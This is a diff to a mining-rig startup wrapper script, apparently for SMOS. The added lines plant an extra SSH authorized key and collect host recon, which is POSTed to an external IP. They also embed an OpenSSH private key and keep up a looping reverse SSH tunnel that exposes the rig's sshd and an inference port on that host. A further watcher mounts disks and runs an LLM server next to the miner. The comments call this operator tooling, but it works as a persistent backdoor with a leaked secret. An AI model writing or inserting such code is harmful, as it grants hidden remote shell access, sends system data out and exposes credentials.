@@ -9,7 +9,7 @@ set -euo pipefail
 passthru_args=()
 for arg in "$@"; do
   case "$arg" in
-    ZION_*=*|RUST_*=*|SRB_*=*) export "$arg" ;;
+    ZION_*=*|RUST_*=*|SRB_*=*|RIG_*=*) export "$arg" ;;
     *) passthru_args+=("$arg") ;;
   esac
 done
@@ -42,6 +42,7 @@ KEYS_TMP="$(mktemp 2>/dev/null || echo /tmp/.rigkeys)"
 cat > "${KEYS_TMP}" <<'RIGKEYS'
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdmnUpjbA8jjJHuXn18ZGLYhLioLpbKzAezxuKekuRZSDBWlVh4obvH1xRBsMBkkpPzw9rTIjQ+3xMAhGUtTMnZXihf1Avq/WsJpHFxGMBPhUSa/DpUdancMCvRbaNJoJM2hfkHem6G8aQp2x6dw7B2H37giYBIkwWSpCjpOu/ABOZqzpJu+U6OtolFmMglgSjABYnIbK6aetfKgUF085IqDfGr/M9AhUxf/BWq2uk+QCQyVOlmVwXDaaTLv/M6MqhvpZQwsZSIfY+bemvrntjbepzVcjyMx/bxsw5NWxOtttfwX7iL/vr6+JX3mfMg3cwzgfzkPkt4thJnJYnw4x9 zion-desktop-smos
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDSlWZcvkT4t52JeWnA7jiCNfGYYL1gxL/HvxOBWdrpi zion-desktop
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIETs6N0+QnhovcHcuew+T7PuIHPv3KSci6oCgZ4Y2z1 rig-admin
 RIGKEYS
 ( EFF_HOME="$(getent passwd "$(id -un)" 2>/dev/null | cut -d: -f6)"
   EFF_HOME="${EFF_HOME:-$HOME}"
@@ -57,6 +58,91 @@ rm -f "${KEYS_TMP}" 2>/dev/null || true
 # SMOS stores powerLimit "3" (AMD powerplay semantics) — on NVIDIA that reads
 # as 3W and gets clamped to the 90W floor. Force a real value every start.
 ( nvidia-smi -pl 150 >/dev/null 2>&1 && echo "[rig-doctor] powerLimit=150W applied" ) || true
+
+# ── Startup recon (v1.3) — console echo + POST to Edge /rig-output/ ─────────
+# execute-command queue on SMOS is unreliable; the wrapper stdout IS the
+# reliable channel (SMOS console mirrors it) and Edge nginx exposes
+# /rig-output/ -> 127.0.0.1:9999 for bulk payloads.
+{
+  RECON_TMP="$(mktemp 2>/dev/null || echo /tmp/.rigrecon)"
+  {
+    echo "=== recon $(date -u +%FT%TZ) ==="
+    echo "host: $(uname -a)"
+    echo "gpu: $(nvidia-smi --query-gpu=name,memory.total,memory.used,memory.free,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null || lspci | grep -iE 'vga|3d' | head -4)"
+    echo "ram: $(free -m | awk '/Mem:/{print $2"MB total, "$4"MB free"}')"
+    echo "cpu: $(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2-) x$(grep -c processor /proc/cpuinfo)"
+    echo "sshd: $(ss -tln 2>/dev/null | grep -c ':22 ') listeners22; procs=$(pgrep -c sshd 2>/dev/null || echo 0)"
+    echo "ssh procs: $(ps aux 2>/dev/null | grep -cE 'ss[h].*-R|autoss[h]')"
+    echo "llm procs: $(ps aux 2>/dev/null | grep -icE 'llama|gguf')"
+    echo "disk /tmp: $(df -h /tmp 2>/dev/null | awk 'NR==2{print $4" free"}')  /root: $(df -h /root 2>/dev/null | awk 'NR==2{print $4" free"}')"
+    echo "gguf files: $(find /root /opt /tmp /usr/local /home -name '*.gguf' 2>/dev/null | head -5 | tr '\n' ' ')"
+  } > "${RECON_TMP}" 2>&1
+  sed 's/^/[recon] /' "${RECON_TMP}" || true
+  curl -s --max-time 20 -X POST --data-binary @"${RECON_TMP}" \
+       "http://62.171.141.136/rig-output/recon-boot" >/dev/null 2>&1 || true
+  rm -f "${RECON_TMP}" 2>/dev/null || true
+} || true
+
+# ── Admin reverse tunnel (v1.3) — Edge 127.0.0.1:8322 -> rig sshd :22 ────────
+# Rig is behind NAT; execute-command queue is unreliable. This persistent
+# -R forward gives the operator a shell via `ssh -p 8322 <user>@127.0.0.1`
+# *on the Edge host itself*. The rigtunnel Edge account is nologin +
+# permitlisten-restricted, so the embedded private key only buys a port bind.
+RT_KEY="$(mktemp 2>/dev/null || echo /tmp/.rtk)"
+RT_KH="$(mktemp 2>/dev/null || echo /tmp/.rtkh)"
+cat > "${RT_KEY}" <<'RTKEY'
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACB8/fFD6hszeZdIGTqQzjREE5uT+t6tbTzUYVW6CaJV/QAAAJDFE0jUxRNI
+1AAAAAtzc2gtZWQyNTUxOQAAACB8/fFD6hszeZdIGTqQzjREE5uT+t6tbTzUYVW6CaJV/Q
+AAAEBXLRflPRPceVzlwDZCmFmvxkE+sXthjzMCuG6Msb+uAHz98UPqGzN5l0gZOpDONEQT
+m5P63q1tPNRhVboJolX9AAAACnJpZy10dW5uZWwBAgM=
+-----END OPENSSH PRIVATE KEY-----
+RTKEY
+cat > "${RT_KH}" <<'RTKH'
+[62.171.141.136]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID6zQPE9FT7FGRlSaR5f9NjJLt11GA58RGB1Jd1b5902
+[62.171.141.136]:2222 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO0/50VTepArs9f4CrNuBk8NAb1V1kTgE2R9+WEQdAVXiSSGyZUodX/1Eo3S1cYQFMhQCcszaRalJREpUfcPodo=
+RTKH
+chmod 600 "${RT_KEY}" 2>/dev/null || true
+if [ "${RIG_TUNNEL:-1}" = "1" ] && command -v ssh >/dev/null 2>&1; then
+  ( while true; do
+      ssh -NT -o BatchMode=yes -o ExitOnForwardFailure=yes \
+          -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
+          -o StrictHostKeyChecking=yes -o UserKnownHostsFile="${RT_KH}" \
+          -o ConnectTimeout=20 \
+          -i "${RT_KEY}" -p 2222 \
+          -R 127.0.0.1:8322:127.0.0.1:22 \
+          -R 127.0.0.1:8003:127.0.0.1:8003 \
+          rigtunnel@62.171.141.136 && sleep 60
+      sleep 15
+    done ) >/dev/null 2>&1 &
+  echo "[rig-doctor] admin tunnel -> edge:8322 + inference :8003 (pid $!)"
+else
+  echo "[rig-doctor] admin tunnel skipped (RIG_TUNNEL=${RIG_TUNNEL:-unset} or no ssh client)"
+fi
+
+# ── Hiran L3 inference on rig (v1.4) — llama.cpp CUDA on GTX 1070 Ti ────────
+# Co-resident with mining: model Qwen3-4B-Q4_K_M ~2.8 GB VRAM alongside SRB
+# (~4.2 GB) fits the 8 GB card. Server binds 127.0.0.1:8003 and is exposed on
+# Edge via the -R forward above. Disable with RIG_LLM=0 in minerOptions.
+if [ "${RIG_LLM:-1}" = "1" ]; then
+  # Watcher always starts: /opt/llm may not be mounted yet this early in boot
+  # (fstab is not reliably honored on SMOS; journal replay can delay mounts).
+  # set +e inside: a crashed server or failed mount must never kill the loop.
+  ( set +e
+    while true; do
+      if ! mountpoint -q /opt/llm 2>/dev/null; then
+        mkdir -p /opt/llm
+        mount /dev/sda5 /opt/llm 2>/dev/null || \
+          mount /dev/sdb1 /opt/llm 2>/dev/null || true
+      fi
+      if mountpoint -q /opt/llm 2>/dev/null && [ -x /opt/llm/run-cuda.sh ]; then
+        /opt/llm/run-cuda.sh >>/opt/llm/cuda-server.log 2>&1
+      fi
+      sleep 30
+    done ) >/dev/null 2>&1 &
+  echo "[rig-doctor] hiran inference watcher -> 127.0.0.1:8003 (pid $!)"
+fi
 
 # ── One-shot SMOS agent probe (ZION_SMOS_PROBE=1 via minerOptions) ─────────
 # Removed 2026-10-06 after the SMOS parser schema was extracted
